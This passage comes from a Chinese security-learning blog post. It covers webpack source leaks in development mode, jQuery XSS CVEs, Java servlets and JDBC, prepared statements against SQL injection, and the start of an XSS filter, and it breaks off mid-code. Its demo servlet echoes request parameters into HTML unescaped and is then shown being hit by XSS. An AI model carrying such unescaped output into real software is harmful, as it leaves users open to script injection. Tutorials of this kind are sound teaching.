class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;main.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>报错Cannot use import statement outside a module，尝试在不支持模块的环境中使用 ES6 的 import 打包语句造成无法执行；</p><p><img src="/assets/image-20240709200949-hel0m7m.png" alt="image">​</p></li><li><p>安装webpack库<code>npm i webpack webpack-cli -g</code>​</p><p><img src="/assets/image-20240709201123-hti84t5.png" alt="image">​</p></li><li><p>创建webpack配置文件—创建src同级文件webpack.config.js不能改名称</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 引入path模块，用于处理文件路径</span><br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-comment">// Webpack配置对象</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    **<span class="hljs-comment">// 指定入口文件，即Webpack从这个文件开始构建依赖图</span><br>    <span class="hljs-attr">entry</span>: <span class="hljs-string">&#x27;./src/main.js&#x27;</span>,**<br><br>    <span class="hljs-comment">// 指定输出配置</span><br>    <span class="hljs-attr">output</span>: &#123;<br>        <span class="hljs-comment">// 输出的文件路径，使用path.resolve确保路径的正确性</span><br>        <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;dist&#x27;</span>),<br><br>        <span class="hljs-comment">// 输出的文件名</span><br>        <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;bundle.js&#x27;</span>,<br><br>        <span class="hljs-comment">// 在每次构建前清理输出目录</span><br>        <span class="hljs-attr">clean</span>: <span class="hljs-literal">true</span>,<br>    &#125;,<br><br>    <span class="hljs-comment">// 指定打包模式，可以是 &#x27;development&#x27; 或 &#x27;production&#x27;</span><br>    <span class="hljs-attr">mode</span>: <span class="hljs-string">&quot;development&quot;</span>, <span class="hljs-comment">// 或者 &quot;production&quot;</span><br>    <span class="hljs-comment">//mode:&quot;production&quot;,</span><br>&#125;;<br></code></pre></td></tr></table></figure></li><li></li><li><p>entry: 指定入口文件，即Webpack从哪个文件开始构建依赖关系图。</p></li><li><p>output: 指定输出的目录和文件名，以及是否在每次构建前清理输出目录。</p></li><li><p>mode: 指定打包的模式，可以是 ‘development’ 或 ‘production’。</p></li><li><p>development 模式下会启用一些开发工具，容易造成源码泄露</p></li><li><p>production 模式下会进行代码优化，代码极简化。</p></li><li><p>运行webpack打包命令<code>npx webpack</code>​</p><p><img src="/assets/image-20240709201343-o76u8ev.png" alt="image">​</p></li><li><p>打包成功后，在index.html中将引用的代码切换为打包好的<code>./dist/bundle.</code>​</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;body&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./dist/bundle.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>&lt;/body&gt;<br></code></pre></td></tr></table></figure></li><li><p>运行成功，并回显定义的两个函数计算结果</p><p><img src="/assets/image-20240709201442-7fqc20s.png" alt="image">​</p></li></ul></li><li><p>webpack安全</p><p> WebPack源码泄漏-模式选择</p><ul><li><p><strong>​<code>development</code>​</strong>​ 模式下会启用一些开发工具，<strong>容易造成源码泄露</strong></p><p><img src="/assets/image-20240709201635-3ricau0.png" alt="image">​</p></li><li><p><strong>​<code>production</code>​</strong>​ 模式下会进行代码优化，<strong>代码极简化</strong>。</p><p><img src="/assets/image-20240709201649-6kb6t6e.png" alt="image">​</p></li></ul><p> 模糊提取安全检查-PacketFuzzer</p><p> <a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p></li><li><p>第三方库-JQuery-使用&amp;安全</p><p> <img src="/assets/image-20240709202351-k8irbjz.png" alt="image">​</p><p> <strong>3.4.1版本就有被xss植入的风险而3.5.1版本没有</strong></p><p> <img src="/assets/image-20240709202415-dccq57b.png" alt="image">​</p><p> <img src="/assets/image-20240709202429-g0pfyij.png" alt="image">​</p><p> 检测：<a href="http://research.insecurelabs.org/jquery/test/">http://research.insecurelabs.org/jquery/test/</a><br> 测试：CVE-2020-11022&#x2F;CVE-2020-11023<br> 参考：<a href="https://blog.csdn.net/weixin_44309905/article/details/120902867">https://blog.csdn.net/weixin_44309905/article/details/120902867</a></p><p> <img src="/assets/image-20240709202514-ih0o747.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="JavaEE应用-Servlet路由技术-JDBC-Mybatis数据库-生命周期"><a href="#JavaEE应用-Servlet路由技术-JDBC-Mybatis数据库-生命周期" class="headerlink" title="JavaEE应用&amp;Servlet路由技术&amp;JDBC&amp;Mybatis数据库&amp;生命周期"></a>JavaEE应用&amp;Servlet路由技术&amp;JDBC&amp;Mybatis数据库&amp;生命周期</h3><ol><li><p>创建项目</p><p> <img src="/assets/image-20240714111750-fmtv76w.png" alt="image">​</p></li><li><p>创建并使用Servlet</p><p> <img src="/assets/image-20240714111942-ahwosdt.png" alt="image">​</p><p> <img src="/assets/image-20240714112315-5ufvbs1.png" alt="image">​</p></li><li><p>配置Servlet路由的两种方式</p><ol><li><p>web.xml配置Servlet路由</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--定义Servlet--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>index<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 指定Servlet类的完整路径 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.demo2.IndexServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 配置Servlet映射 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>index<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 指定Servlet的URL映射 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240714112834-9tsw4bw.png" alt="image">​</p></li><li><p>WebServlet配置Servlet路由</p><p> <img src="/assets/image-20240714113051-kiy40oi.png" alt="image">​</p></li></ol></li><li><p>写入内置方法(init service destroy doGet doPost)—–此时用的是WebServlet配置Servlet路由</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo1;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletConfig;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.ServletResponse;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-comment">// 使用@WebServlet注解将Servlet映射到特定的URL</span><br><span class="hljs-meta">@WebServlet(&quot;/a&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-comment">// 处理GET请求的方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;--------------doGet&quot;</span>);<br><br>        <span class="hljs-comment">// 从请求中获取参数&quot;id&quot;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;id&quot;</span>);<br><br>        <span class="hljs-comment">// 设置响应的内容类型</span><br>        resp.setContentType(<span class="hljs-string">&quot;text/html; charset=GBK&quot;</span>);<br><br>        <span class="hljs-comment">// 获取PrintWriter以将HTML响应发送给客户端</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br><br>        <span class="hljs-comment">// 输出从GET请求中收到的数据</span><br>        out.println(<span class="hljs-string">&quot;这是GET请求的数据:&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;id：&quot;</span> + id + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>        out.flush();<br>        out.close();<br>    &#125;<br><br>    <span class="hljs-comment">// 处理POST请求的方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">// 从请求中获取参数&quot;name&quot;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br><br>        <span class="hljs-comment">// 设置响应的内容类型</span><br>        resp.setContentType(<span class="hljs-string">&quot;text/html; charset=GBK&quot;</span>);<br><br>        <span class="hljs-comment">// 获取PrintWriter以将HTML响应发送给客户端</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br><br>        <span class="hljs-comment">// 输出从POST请求中收到的数据</span><br>        out.println(<span class="hljs-string">&quot;这是post提交的数据&quot;</span>);<br>        out.println(name);<br>        out.flush();<br>        out.close();<br><br>        System.out.println(<span class="hljs-string">&quot;--------------doPost&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 当Servlet首次创建时调用的初始化方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;--------------init&quot;</span>);<br><br>        <span class="hljs-comment">// 可以在这里添加任何初始化任务的代码</span><br>    &#125;<br><br>    <span class="hljs-comment">// 当Servlet被销毁时调用的方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;--------------destroy&quot;</span>);<br>        <span class="hljs-built_in">super</span>.destroy();<br>    &#125;<br><br>    <span class="hljs-comment">// 处理GET和POST请求的服务方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;--------------http service&quot;</span>);<br>        <span class="hljs-built_in">super</span>.service(req, resp);<br>    &#125;<br><br>    <span class="hljs-comment">// 覆盖的用于ServletRequest和ServletResponse的服务方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;--------------Servlet service&quot;</span>);<br>        <span class="hljs-built_in">super</span>.service(req, res);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li><p>初始化<img src="/assets/image-20240714114145-zju9om2.png" alt="image">​</p></li><li><p>使用doGet（由于Servlet生命周期所以此时没有init）</p><p> <img src="/assets/image-20240714114510-d9x9hbz.png" alt="image">​</p></li><li><p>使用doPost</p><p> <img src="/assets/image-20240714114828-5u6mm1e.png" alt="image">​</p></li><li><p>处理接受和回显</p><ul><li><p>HttpServletRequest（HTTP请求的信息）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>ServletRequest的子接口：<span class="hljs-strong">**HttpServletRequest是ServletRequest**</span>接口的子接口，提供了用于处理HTTP请求的额外功能。<br><span class="hljs-bullet">- </span>getParameter(name)：通过参数名获取请求中的值。返回一个<span class="hljs-strong">**String**</span>，表示与给定参数名相对应的单个值。<br><span class="hljs-bullet">- </span>getParameterValues(name)：通过参数名获取请求中的多个值。返回一个<span class="hljs-strong">**String[]**</span>，表示与给定参数名相对应的多个值。<br></code></pre></td></tr></table></figure></li><li><p>HttpServletResponse（HTTP响应的信息）</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">- ServletResponse的子接口：HttpServletResponse是ServletResponse接口的子接口，提供了用于处理HTTP响应的额外功能。<br>- <span class="hljs-built_in">setCharacterEncoding</span>()：设置响应的字符编码格式。通常用于确保正确的文本输出。<br>- <span class="hljs-built_in">setContentType</span>()：设置响应内容的类型和编码。常用于指定输出的数据类型，如<span class="hljs-selector-tag">HTML</span>、JSON等。<br>- <span class="hljs-built_in">getWriter</span>()：获取一个PrintWriter字符输出流，用于向客户端发送文本数据。<br>- PrintWriter：PrintWriter是用于向客户端输出字符数据的类，可以接受各种数据类型，然后将其转换为文本并发送到客户端。<br></code></pre></td></tr></table></figure></li></ul></li></ol></li><li><p>Servlet生命周期</p><p> <img src="/assets/image-20240714114214-yv096wi.png" alt="image">​</p></li><li><p>JDBC数据库开发</p><p> 1、下载jar—-<a href="https://mvnrepository.com/">下载地址</a></p><p> <img src="/assets/image-20240714120505-l6hn9n7.png" alt="image">​</p><p> 2、引用封装jar</p><p> 创建lib目录，复制导入后，添加为库</p><p> <img src="/assets/image-20240714120940-qa6j0cj.png" alt="image">​</p><p> <img src="/assets/image-20240714121049-daj0wkj.png" alt="image">​</p><p> <img src="/assets/image-20240714121027-hqqt9fg.png" alt="image">​</p><p> 3、注册数据库驱动</p><p> “com.mysql.jdbc.Driver”： 这是 MySQL JDBC 驱动程序的类名。JDBC（Java Database Connectivity）是 Java 用于与数据库交互的 API，而不同的数据库供应商提供了各自的 JDBC 驱动程序。在这里，”com.mysql.jdbc.Driver” 是 MySQL JDBC 驱动程序的类名。</p><p> <strong>加载和初始化：</strong>  当调用 <strong>​<code>Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</code>​</strong> ​ 时，它会尝试查找、加载并初始化指定的类。在这个过程中，MySQL JDBC 驱动程序的静态代码块（<strong>​<code>static &#123;...&#125;</code>​</strong> ​）会被执行，这通常用于注册驱动程序。</p><ul><li>在旧版本的 MySQL 驱动中，<strong>​<code>com.mysql.jdbc.Driver</code>​</strong>​ 是驱动类的完整路径。</li><li>在新版本中，<strong>​<code>com.mysql.cj.jdbc.Driver</code>​</strong>​ 是 MySQL Connector&#x2F;J 的驱动类。</li></ul> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br></code></pre></td></tr></table></figure><p> 4、建立数据库连接</p><p> <img src="/assets/image-20240714121953-7wb52fr.png" alt="image">​</p><p> 5、创建Statement执行SQL</p><ul><li><p><code>connection.createStatement();</code>​： 在<code>Connection</code>​对象上调用<code>createStatement</code>​方法，创建一个<code>Statement</code>​对象。<code>Statement</code>​对象用于执行SQL语句，它可以执行静态的SQL查询、更新、删除等操作。<code>createStatement</code>​方法返回一个新的<code>Statement</code>​对象。</p></li><li><p>创建一个<code>Statement</code>​对象，然后使用该对象执行给定的SQL查询语句，将查询结果存储在一个<code>ResultSet</code>​对象中。这样，您可以通过遍历<code>ResultSet</code>​来检索和处理查询的结果集中的数据。</p></li></ul> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 创建Statement对象</span><br><span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<br><span class="hljs-comment">// 执行查询，获取结果集</span><br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> statement.executeQuery(sql);<br></code></pre></td></tr></table></figure><p> 6、结果ResultSet进行提取</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 遍历结果集</span><br>        <span class="hljs-keyword">while</span> (rs.next())&#123;<br>            <span class="hljs-comment">// 从结果集中获取每一行的数据</span><br>            <span class="hljs-comment">// 获取整型列 &quot;id&quot;</span><br>            <span class="hljs-type">int</span> id=rs.getInt(<span class="hljs-string">&quot;id&quot;</span>);<br>            <span class="hljs-comment">// 获取字符串列 &quot;page_title&quot;</span><br>            String title= rs.getString(<span class="hljs-string">&quot;page_title&quot;</span>);<br>            <span class="hljs-comment">// 获取字符串列 &quot;heading&quot;</span><br>            String heading= rs.getString(<span class="hljs-string">&quot;heading&quot;</span>);<br>            <span class="hljs-comment">// 获取字符串列 &quot;subheading&quot;</span><br>            String s_heading= rs.getString(<span class="hljs-string">&quot;subheading&quot;</span>);<br>            <span class="hljs-comment">// 获取字符串列 &quot;content&quot;</span><br>            String content= rs.getString(<span class="hljs-string">&quot;content&quot;</span>);<br>            <span class="hljs-comment">// 获取字符串列 &quot;img&quot;</span><br>            String img= rs.getString(<span class="hljs-string">&quot;img&quot;</span>);<br>            <span class="hljs-comment">// 输出每一行的数据，以便查看结果</span><br>            System.out.println(id+<span class="hljs-string">&quot;||&quot;</span>+title+<span class="hljs-string">&quot;||&quot;</span>+heading+<span class="hljs-string">&quot;||&quot;</span>+s_heading+<span class="hljs-string">&quot;||&quot;</span>+content+<span class="hljs-string">&quot;||&quot;</span>+img);<br>        &#125;<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240714122837-mrmvsr4.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="JavaEE应用-SQL预编译-Filter过滤器-Listener监听器-访问控制"><a href="#JavaEE应用-SQL预编译-Filter过滤器-Listener监听器-访问控制" class="headerlink" title="JavaEE应用&amp;SQL预编译&amp;Filter过滤器&amp;Listener监听器&amp;访问控制"></a>JavaEE应用&amp;SQL预编译&amp;Filter过滤器&amp;Listener监听器&amp;访问控制</h3><ol><li><p>SQL预编译</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 预编译写法</span><br><span class="hljs-type">String</span> <span class="hljs-variable">safesql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM news WHERE id=?&quot;</span>;<br><br><span class="hljs-comment">// 使用PreparedStatement</span><br><span class="hljs-keyword">try</span> (<span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">preparedStatement</span> <span class="hljs-operator">=</span> connection.prepareStatement(safesql)) &#123;<br>    <span class="hljs-comment">// 设置参数，防止SQL注入攻击</span><br>    preparedStatement.setInt(<span class="hljs-number">1</span>, id);<br><br>    <span class="hljs-comment">// 执行查询</span><br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> preparedStatement.executeQuery();<br><br>    <span class="hljs-comment">// 处理结果集...</span><br>&#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">预编译写法： safesql 是一个预编译的 SQL 查询语句，其中 ? 是一个占位符，表示将在执行时动态替换。<br>使用 PreparedStatement： PreparedStatement 是 Statement 的子接口，用于执行预编译的 SQL 语句。通过调用 connection.prepareStatement(safesql) 创建一个 PreparedStatement 对象。<br>设置参数： 使用 setXXX 方法设置占位符的值。在这里，使用 setInt(<span class="hljs-number">1</span>, id) 将 id 的值设置到第一个占位符上。这种方式防止了 SQL 注入攻击，因为参数值是通过预编译的方式传递的，而不是通过直接拼接字符串。<br>执行查询： 调用 executeQuery() 执行查询，得到 ResultSet 对象。<br>处理结果集： 根据业务需要，处理查询结果集的数据。<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240714173424-hchhrpe.png" alt="image">​</p><ul><li><strong>使用预编译写法，固定sql语句的逻辑，防止进行sql注入</strong></li></ul><p> <img src="/assets/image-20240714173440-exkxnkh.png" alt="image">​</p></li><li><p>Filter过滤器</p><ul><li><p>防御XSS</p><p><img src="/assets/image-20240714174219-wc7iq4d.png" alt="image">​</p><p>启动服务器，尝试进行Xss攻击，发现可以</p><p><img src="/assets/image-20240714174047-poo8ige.png" alt="image">​</p><p><img src="/assets/image-20240714174103-u5sy8em.png" alt="image">​</p><p>创建过滤器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.filterdemo1.filter;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><br><span class="hljs-meta">@WebFilter(&quot;/test&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XssFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-comment">//中间件启动后就自动运行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span 